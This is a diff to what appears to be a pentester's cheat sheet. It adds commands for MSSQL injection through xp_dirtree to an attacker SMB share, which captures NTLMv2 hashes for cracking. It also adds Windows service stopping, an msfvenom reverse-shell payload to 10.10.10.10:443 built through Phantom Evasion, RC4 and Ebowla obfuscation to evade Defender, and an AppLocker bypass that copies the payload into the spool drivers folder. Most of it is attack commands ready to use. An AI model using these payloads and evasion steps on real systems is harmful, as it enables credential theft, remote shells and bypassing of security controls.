@@ -17,6 +17,21 @@ openssl s_client -connect 10.10.10.250:443
 '; select pg_sleep(10);-- -
 ```
 
+## Microsoft IIS
+
+You may be available to to load external server resources abusing XP_DirTree
+
+```bash
+# Share a resource with Impackets
+impacket-smbserver smbFolder $(pwd) -smb2support
+
+# Injection to the URL
+id=1;EXEC MASTER.sys.xp_dirtree '\\10.10.10.10\smbFolder\test'
+
+# Crack the NTLMv2 Hash from the user
+john -w:rockyou.txt hash
+```
+
 ## Command Injection
 
 ### Ask Jeeves
@@ -104,8 +119,8 @@ GetUsersSPNs.py 'domain.local/jan:password'
 ## Windows Internal Enumeration
 
 ```powershell
-# System Enumeration
-systeminfo
+# System Enumeration / Access Denied
+systeminfo / [Environment]::Is64BitOperatingSystem, [Environment]::Is64BitProcess (PowerShell Sysnative Migration if false)
 windows version registry key print
 .\winPease.exe
 
@@ -121,9 +136,110 @@ net group
 
 # Services Enumeration
 services
+cmd /c sc query
+cmd /c sc stop <service>
+Get-WmiObject win32_service
+cd HKLM:SYSTEM\CurrentControlSet\Services
+Stop-Service -Name <ServiceName> -Force
+
 
 # Files Enumeration
 icacls file.txt
+dir /s /r file.txt
+```
+
+## Evading Defender
+
+### Phantom Evasion
+
+Using [Phantom Evasion](https://github.com/oddcod3/Phantom-Evasion)
+
+Windows Module > Windows Shellcode Injection > Enter > x64 > msfvenom > Yes > windows/x64/shell_reverse_tcp > 10.10.10.10 > 443 > Enter > Double-key Xor > Enter > Heap_RWX > Enter till output format > payload.exe 
+
+### MSFVenom
+
+Try RC4 
+
+```shell
+msfvenom --encrypt rc4 --encrypt-key supersecretkey -f c
+```
+
+### Obfuscating payloads with Ebowla
+
+Clone [Ebowla](https://github.com/Genetic-Malware/Ebowla)
+
+List Machine Enviorment Variables
+
+```powershell
+hostname
+```
+
+Modify genetic.config
+
+```shell
+output_type = GO
+payload_type = EXE
+
+# Fill the available entries
+[[ENV_VAR]]
+computerName = 'Janrdz'
+```
+
+Use Python, the final payload will be at the output directory
+
+```shell
+python ebowla.py payload.exe genetic.config
+
+# Compiling the payload (in this case x64)
+./build_x64_go.sh payload finalPayload.exe
+```
+
+### Evil-WinRM
+
+```Shell
+menu
+```
+
+### Mingw-w64
+
+Install mingw-64
+
+```shell
+sudo apt install mingw-w64
+```
+
+Create a .c file
+
+```shell
+nvim test.c
+```
+
+Execute a command at system level
+
+```c
+# include <stdlib.h>
+
+int main() {
+        system("");
+}
+```
+
+Compile
+
+```shell
+x86_64-w64-mingw32-gcc test.c -o payload.exe
+```
+
+### Program blocked by group policy
+
+If a program is blocked by a group policy 
+
+Use [UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList) and try \drivers\color
+
+Copy the payload. If it works after that, run where desired for NT Authority/System 
+
+```powershell
+cp payload.exe C:\Windows\System32\spool\drivers\color\payload.exe
 ```
 
 ## Enumerating Firewall
